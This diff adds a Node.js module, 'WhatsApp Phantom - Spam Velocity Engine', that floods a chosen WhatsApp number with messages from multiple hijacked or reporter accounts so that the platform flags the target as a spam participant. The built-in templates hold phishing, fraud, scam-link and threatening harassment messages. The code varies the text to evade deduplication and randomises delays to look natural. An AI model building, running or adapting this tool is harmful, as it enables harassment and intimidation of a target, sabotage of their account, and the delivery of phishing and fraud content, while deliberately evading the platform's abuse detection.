@@ -1,0 +1,192 @@
+/**
+ * WhatsApp Phantom - Spam Velocity Engine
+ * By Hillary Tizian
+ * 
+ * High-velocity message delivery from multiple accounts
+ * Triggers WhatsApp's spam detection ML model:
+ * - Sudden message volume spike
+ * - High sent-to-received ratio
+ * - Policy-violating content patterns
+ * - Cross-account targeting
+ */
+
+const fs = require('fs');
+const path = require('path');
+const chalk = require('chalk');
+const { showStatus } = require('./banner');
+
+let Baileys;
+let makeWASocket, useMultiFileAuthState, DisconnectReason;
+
+try {
+  Baileys = require('@whiskeysockets/baileys');
+  makeWASocket = Baileys.makeWASocket;
+  useMultiFileAuthState = Baileys.useMultiFileAuthState;
+  DisconnectReason = Baileys.DisconnectReason;
+} catch (e) {
+  showStatus('Baileys module not found. Run: npm install @whiskeysockets/baileys', 'error');
+  throw e;
+}
+
+const SPAM_TEMPLATES_PATH = path.join(__dirname, '..', 'cfg', 'spam-templates.json');
+
+let spamTemplates = null;
+function loadTemplates() {
+  if (spamTemplates) return spamTemplates;
+  try {
+    if (fs.existsSync(SPAM_TEMPLATES_PATH)) {
+      spamTemplates = JSON.parse(fs.readFileSync(SPAM_TEMPLATES_PATH, 'utf8'));
+      return spamTemplates;
+    }
+  } catch (e) {}
+  
+  spamTemplates = {
+    templates: [
+      { type: 'spam_offer', content: '$$$ MAKE MONEY FAST $$$ Click here: http://bit.ly/scam-link No experience needed!', weight: 1.0 },
+      { type: 'phishing_link', content: 'URGENT: Your account will be suspended! Verify: http://fake-login.com', weight: 3.5 },
+      { type: 'harassment', content: 'I know where you live. I have your IP. You will be reported to the authorities.', weight: 2.0 },
+      { type: 'fraud', content: 'Congratulations! You won $1,000,000! Send $100 processing fee to claim.', weight: 3.5 }
+    ]
+  };
+  return spamTemplates;
+}
+
+async function createSocket(sessionDir, accountId) {
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+  
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    syncFullHistory: false,
+    markOnlineOnConnect: false,
+    shouldIgnoreJid: () => true,
+    defaultQueryTimeoutMs: 15000,
+    emitOwnEvents: false,
+    logger: { info: () => {}, warn: () => {}, error: () => {}, debug: () => {}, trace: () => {} }
+  });
+  
+  sock.ev.on('creds.update', saveCreds);
+  
+  return new Promise((resolve, reject) => {
+    const timeout = setTimeout(() => reject(new Error(`Timeout ${accountId}`)), 30000);
+    
+    sock.ev.on('connection.update', ({ connection }) => {
+      if (connection === 'open') {
+        clearTimeout(timeout);
+        resolve({ sock, saveCreds });
+      }
+    });
+    
+    // Check if already connected
+    if (sock.user?.id) {
+      clearTimeout(timeout);
+      resolve({ sock, saveCreds });
+    }
+  });
+}
+
+async function run(config, targetNumber, intensity = 'extreme') {
+  showStatus('=== SPAM VELOCITY ENGINE ===', 'attack');
+  
+  const templates = loadTemplates();
+  const results = {
+    messagesSent: 0,
+    accountsUsed: 0,
+    errors: []
+  };
+  
+  // Message counts by intensity
+  const msgCounts = { normal: 15, aggressive: 30, extreme: 60 };
+  const totalMessages = msgCounts[intensity] || 30;
+  
+  const sessionsDir = path.join(__dirname, '..', 'sessions');
+  
+  // Find authenticated accounts (prefer non-reporter accounts or use reporters)
+  const activeReporters = config.reporters.filter(r => {
+    const sessionPath = r.session || path.join(sessionsDir, `reporter_${r.id}`);
+    return fs.existsSync(path.join(sessionPath, 'creds.json'));
+  });
+  
+  if (activeReporters.length === 0) {
+    showStatus('No authenticated accounts for spam delivery.', 'warn');
+    return results;
+  }
+  
+  const targetJid = `${targetNumber}@s.whatsapp.net`;
+  
+  showStatus(`Target: ${targetJid}`, 'target');
+  showStatus(`Sending ${totalMessages} messages from ${activeReporters.length} accounts...`, 'info');
+  
+  // Calculate messages per account
+  const msgsPerAccount = Math.ceil(totalMessages / activeReporters.length);
+  
+  const accountPromises = activeReporters.map((reporter, idx) => 
+    (async () => {
+      let sock = null;
+      try {
+        const sessionPath = reporter.session || path.join(sessionsDir, `reporter_${reporter.id}`);
+        const { sock: socket } = await createSocket(sessionPath, reporter.id);
+        sock = socket;
+        
+        showStatus(`Account ${reporter.id}: Starting spam delivery`, 'attack');
+        
+        let sent = 0;
+        for (let i = 0; i < msgsPerAccount; i++) {
+          const template = templates.templates[i % templates.templates.length];
+          
+          // Rotate through different content to avoid exact-match dedup
+          const variations = [
+            template.content,
+            template.content.toUpperCase(),
+            template.content + ' ' + Math.random().toString(36).substring(2, 6),
+            `[${i}] ` + template.content
+          ];
+          const message = variations[i % variations.length];
+          
+          try {
+            await sock.sendMessage(targetJid, { text: message });
+            sent++;
+            results.messagesSent++;
+            
+            // Random delay to appear more natural (300-1200ms)
+            await new Promise(r => setTimeout(r, 300 + Math.random() * 900));
+          } catch (e) {
+            results.errors.push(`Acc${reporter.id} msg${i}: ${e.message}`);
+            
+            // If rate limited, wait a bit
+            if (e.message.includes('rate') || e.message.includes('429')) {
+              showStatus(`Account ${reporter.id}: Rate limited, backing off 5s...`, 'warn');
+              await new Promise(r => setTimeout(r, 5000));
+            }
+          }
+        }
+        
+        showStatus(`Account ${reporter.id}: Sent ${sent}/${msgsPerAccount} messages`, 'ok');
+        results.accountsUsed++;
+        
+        if (sock) {
+          await sock.ws.close();
+        }
+      } catch (e) {
+        results.errors.push(`Acc${reporter.id}: ${e.message}`);
+        if (sock) {
+          try { await sock.ws.close(); } catch (ex) {}
+        }
+      }
+    })()
+  );
+  
+  // Run accounts with staggered starts
+  for (let i = 0; i < accountPromises.length; i++) {
+    accountPromises[i].then(() => {});
+    await new Promise(r => setTimeout(r, 2000));
+  }
+  
+  await Promise.all(accountPromises);
+  
+  showStatus(`Spam Engine Summary: ${results.messagesSent} messages from ${results.accountsUsed} accounts`, 'ok');
+  
+  return results;
+}
+
+module.exports = { run };
